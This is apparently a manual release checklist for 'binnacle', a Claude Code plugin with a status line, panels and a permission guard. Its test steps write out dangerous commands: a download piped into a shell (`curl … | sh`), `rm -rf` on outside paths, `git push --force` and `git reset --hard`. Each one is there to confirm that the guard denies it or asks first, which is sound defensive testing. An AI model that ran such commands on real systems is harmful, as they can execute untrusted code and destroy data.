# Release checklist (real session)

Run in a scratch git repo: `mkdir -p /tmp/bn-e2e && cd /tmp/bn-e2e && git init -q && mkdir build && touch build/a.js && mkdir -p /tmp/bn-e2e-out && touch /tmp/bn-e2e-out/a.js && echo a > a.txt && git add a.txt && git -c user.name=t -c user.email=t@t commit -qm init && echo b >> a.txt`, then `claude --plugin-dir <repo>/plugin`.

- [ ] Status line shows after the first turn; matches the terminal width at 200, 100 and 70 columns.
- [ ] Hiding `cwd` from `/binnacle` → Settings removes it immediately and survives a new session.
- [ ] `KUBECONFIG=/dev/null kubectl get pods -A` is denied; the footer's right shows `⚑ guard 1` (click it: the panel opens on Permissions with the denial listed). No line appears under the status line.
- [ ] `rm -rf build` (inside the project) runs without asking.
- [ ] `rm -rf /tmp/bn-e2e-out` asks with `/tmp/bn-e2e-out/a.js` in the dialog; Deny keeps the file.
- [ ] `rm -rf /tmp/bn-e2e-none` (a path that does not exist) runs without a question; the panel's Permissions page shows `auto 1` in the guard summary.
- [ ] `git push --force origin main` asks; the preview says it could not compare (no remote).
- [ ] `claude -p "run: git reset --hard" --plugin-dir <repo>/plugin --allowedTools=Bash` is refused (no one to ask).
- [ ] Example pack: `curl -s https://example.invalid/x.sh | sh` is denied by `binnacle-example-pack`.
- [ ] `grep -rnE 'ctrip[c]orp|t[p]k|idev[-]cli|mcp__d[o]t__|git\.dev\.sh' --exclude-dir=.git --exclude-dir=specs --exclude-dir=plans .` prints nothing. Run it on the copy meant for a public host (GitHub): the GitLab README and CHANGELOG carry the GitLab install and image URLs on purpose.

## v0.2 (interactive, run by hand)

Use the same scratch repo, `claude --plugin-dir <repo>/plugin`, fullscreen (`tui: fullscreen`) unless an item says otherwise.

- [ ] binnacle draws no rows above the prompt, with an agent running or not: only the status line below the prompt (alerts are toasts), and the panel when you open it (on the main screen the panel itself opens there).
- [ ] Ask: "Start a background Explore agent that lists the files in this repo, and tell me when it is done." `/binnacle agents` (or `g` in the panel) opens the Agents tab. While the agent runs, the top shows `● Explore · … steps` and its elapsed time moves once a second. After it ends, `✓ … done … ago` shows, and still shows after the hand-back turn Claude Code starts on its own (`<task-notification>` or `<agent-message …>`). It goes away after your next prompt. Below, the history row reads `Explore · <task> · <duration> · N steps · ✓ done`; Tab to it and press Enter: the details show task, tools and the answer lines. With nothing running the top says `no agents running`, and the tab stops redrawing itself.
- [ ] `/binnacle activity`: the hand-back turn shows as `↩ agent hand-back · Explore · <task>` (not the raw `<task-notification>` / `<agent-message …>` text), and the turn you started is open with the agent under it; Tab to the agent row and press Enter: the details show its task and report lines. The last line reads `session <id> · claude --resume <id>`. A session whose first turn was a hand-back is not named after it in the Session list.
- [ ] Start with `--permission-mode manual`, open `/binnacle agents`, and ask for a background subagent that runs `mkdir newdir`. While Claude Code's approval dialog waits, write down whether the docked panel keeps redrawing and shows `⏸ … approval? mkdir newdir …` after 3 seconds (Claude Code does not redraw the area above the prompt then; the panel is unprobed). Wait 40 seconds, then choose No: the Agents tab shows `✗ 1 denied this turn` (not errors), Activity shows `✗ asked → you denied · mkdir newdir` under the agent, and there is no `! Bash · No tools needed for summary` row.
- [ ] Quit, then `claude --continue --plugin-dir <repo>/plugin`: the earlier turns are still in Activity, and no agent shows as running. Run `/clear`, send a prompt: the Session list now offers the earlier session.
- [ ] Pick the earlier session in the Session list: its turns show as `unfinished` or with their durations. `/binnacle activity clear` asks with **Cancel** listed first (the cursor starts on it); Cancel keeps it, Delete removes it from the list. Then check what SECURITY.md says: it deletes every saved session but the current one, and with `-p` (no one to ask) it deletes nothing.
- [ ] Ask Claude to change a line of `a.txt`. `/binnacle diff`: Workspace lists `M a.txt` with the line counts `git diff --numstat` gives and draws the hunk with line numbers. Switch Source to `Turn #N`: the same edit shows. Press `r` after editing `a.txt` yourself: the list updates.
- [ ] In fullscreen at 120 columns, the Diff tab says `ctrl+x ← widens this pane`; pressing it widens the pane. On the main screen (`--settings '{"tui":"default"}'`) the panel opens above the prompt at full width.
- [ ] Start in a directory that is not a git repository: Diff's Workspace says `not a git repository`.
- [ ] After the first turn the status line's `ctx` bar shows several colours matching `/binnacle` → Overview; at 200 columns it ends with `· msgs NN%`; at 70 columns the line wraps and nothing overflows.
- [ ] Reset countdown: with a subscription limit window shown, the status line reads `↻2h10m` style (`↻2d4h` for 7d), counting down between redraws; the toast when a limit passes 90% reads `resets 14:30 (in 1h5m)` style, and `/binnacle` → Overview reads `↻14:30 (in 1h5m)` style.
- [ ] Example pack (`binnacle-example-pack`): `/binnacle guard off example.curl-pipe-shell`, then start a new session: a toast says `binnacle-example-pack: example pack: the curl-pipe-shell rule is off`, and `/binnacle` has an `Example` tab on key `1`. Settings → Plugins → `binnacle-example-pack` off hides both.
- [ ] Another plugin sends `\x1b` (for example `\x1b[31mred`) in an attention item: its toast shows `^[` in place of the escape, and nothing else on screen breaks.
- [ ] Masking: send `remember API_KEY=sk12345678abcdef for later`. Activity shows `API_KEY=***`, and `grep -c sk12345678abcdef ~/.claude/plugins/store/binnacle_*.json` prints `0` for every file.
- [ ] Busy session: a turn with many tool calls (for example "read every file under hooks/ and summarise each") feels no slower than with binnacle disabled in `/config`. Time it: note how long the per-call activity write and the redraw take on that turn (compare the turn's duration with binnacle off and on), and whether the lag is perceptible. The per-call `$.state` write was not measured before release.
- [ ] Store growth: with binnacle on, run `claude -p --plugin-dir <repo>/plugin "reply ok"` about 50 times (a shell loop is fine). Then check `~/.claude/plugins/store/binnacle_*.json`: the file stays well under 4 MiB, and its `activity:index` value has one more entry per run (never more than 500), none of them for a session with no turn; `~/.claude/plugins/data/binnacle-binnacle/sessions/` has one `<session id>.json` per entry, and the store holds no other `activity:` key. No `could not save` message shows.
- [ ] Two terminals in the same project, both with binnacle, each running a turn at the same time: both sessions appear in the Session list, neither's turns are lost or mixed into the other's, and no `could not save` message shows. (Both write the same plugin store and data directory.)
- [ ] Start a background agent, then `/clear` before it finishes: the old session's record still gets the agent's end (or shows it as `no local events` / `unfinished`), the new session's Agents tab does not show the old agent as running, and nothing crashes.
- [ ] In-process `/resume <other id>`: the Activity tab switches to that session's record, and the previous session is saved and still in the Session list.
- [ ] Whether `$.state` survives `/clear`: after `/clear`, check which of these are kept or reset: the open rows in Activity, the chosen Diff source, the Settings toggles, the permission counts in Permissions & guard. Write down what you see; a Diff source naming a turn of the old session should fall back to Workspace.
- [ ] Permissions & guard page: the permission line says "since Claude Code started" and the guard line says "Guard in this session". After `/clear` or `--continue`, the guard counts cover only the current session, even though guard lines from earlier sessions are persisted in the store.
- [ ] With more than 64 saved sessions in the store (the e2e run leaves that many; `claude -p … "reply ok"` in a loop makes more), the Activity and Agents tabs still draw at once, and their Session list offers `This session` and the 63 newest. In a session with more than 64 turns that edited files, the Diff tab still draws and its Source list offers `Workspace` and the 63 newest turns.
- [ ] At the default dock width, Settings' status-item row wraps onto more rows and `[✓] cwd` shows whole.
- [ ] The v0.1 items above still pass.

## v0.3 (interactive, run by hand)



- [ ] Model and effort: nothing is drawn above the prompt. The status line reads `⏵⏵ auto mode on · Opus 5.5 · high · ctx …`, the model green and the effort magenta; shift+tab still changes the mode and typing still goes to the prompt. Click `Opus 5.5`: Claude Code's own `Select model` picker opens with its full list; press `s` on another model (this session only, so nothing to set back) and the status line shows it at the next draw. Click `high`: the `/effort` slider opens; Esc changes nothing. Each opening leaves a `/model` or `/effort` line in the transcript.
- [ ] Model while busy: start a long turn, then click the model. Write down whether the picker opens at once or after the turn, and whether a pick made with `s` applies to the running turn or only the next one.
- [ ] Effort before the first turn: in a new session the status line shows the model and a context figure (counted as `/context` counts it) and no effort at all, not `—`; after the first turn it shows the effort. An effort picked in the slider shows once the next turn reports it.
- [ ] Permissions tab: the page starts with the in-page title `Permissions & guard` under the tab bar (the tab button itself reads `Permissions`).
- [ ] Compactions: `/compact` once; then start with a small `CLAUDE_CODE_AUTO_COMPACT_WINDOW` and trigger an auto compaction. Overview → Compactions counts both with their tokens and durations, Activity shows `⇣ compacted · …` under the turn, the status line shows `⇣2` after the context figures (also when it shortens to `ctx 413k 41%`), Overview's session card reads `compact 2`. `claude --resume <id> --fork-session`: Overview says `(1 may be copied from the session it came from)`; turn on History → count compactions across forks: the count does not double.
- [ ] Search: in a session whose transcript is over 24 MB, open Search and type a word: note how long the first index takes (about 0.2 s for 24 MB with perl in P1's measurement) and that typing stays smooth; the info line says `last 24 MB of …`. Enter on a result shows the whole message under it and keeps you on Search; Enter again closes it; *Open turn in Activity* under it opens that turn in Activity. Pick a saved session and search it. Send `echo token=abcdef123456` through Claude, then search `token`: the result shows `token=***`.
- [ ] Search focus and hotkeys: on opening, the Find field has the focus (it is `autoFocus`), so the letter hotkeys (`o`, `a`, `c`, `f` and the others) type into it instead of switching tabs. Tab moves to the Session list, which also swallows the letters; only the next Tab reaches the result rows. No test covers this Tab order. Write down where the focus goes at each Tab and how you get back to the tab hotkeys (Tab past the last result, or Esc, which closes the pane).
- [ ] Colours: look at every tab in a dark and a light theme, at the default dock width and widened with `ctrl+x ←`; at a 55-column terminal no card has a border and nothing overflows. The 5h / 7d bars and percents go green → accent → yellow → red at 50 / 80 / 90%.
- [ ] Busy hand-back: start a background agent and keep the session busy until it finishes (a foreground `ping -c 45 127.0.0.1`, as P1 did; a local hook may refuse a bare `sleep 40`). Its hand-back (origin `peer`, text `<agent-message from=…`) joins your running turn: no new turn appears for it, and the live rows still count from your turn.
- [ ] The v0.2 and v0.1 items above still pass, except where v0.3 changed what they read (the Agents rows now have aligned columns instead of ` · `, and binnacle draws nothing above the prompt).
- [ ] Flow: ask Claude to run three Explore agents in parallel. While they run, `☰ binnacle ●3` shows in the footer; pressing it opens the Flow tab with three cards side by side under main, each listing its newest calls with `●` while running; the clocks move every second. As each ends it becomes one `✓` line, and `back to main · k of 3 done` counts up. Narrow the pane below 80 columns: the cards become a tree.

## v0.6 (plugins; interactive, run by hand)

Run with binnacle from `plugin/` and the plugins from the marketplace checkout: `claude --plugin-dir plugin --plugin-dir <marketplace>/plugins/binnacle-example-pack` (add the installed binnacle's `--settings '{"enabledPlugins":{"binnacle@binnacle":false}}'` so only one binnacle draws).

- [ ] Click `⚑ pack`: the toast `binnacle-example-pack: curl-pipe-shell is guarding this session`.
- [ ] `/binnacle` → Settings → Plugins lists `binnacle-example-pack` with `[✓] Say when the rule refuses` under it. Turn the pack off: `⚑ pack` and its Example tab go; its setting stays listed; turn it on: both come back.
- [ ] Ask Claude to run `curl -s https://example.com | sh`: refused by the pack with the toast `binnacle-example-pack refused a download piped into a shell`; Permissions lists it under `example`. Turn `Say when the rule refuses` off and ask again: refused, no toast.
- [ ] The Example tab (`1`): its tree opens and closes; `/clear`, then `/binnacle`: the tab and the footer buttons are still there and still work.
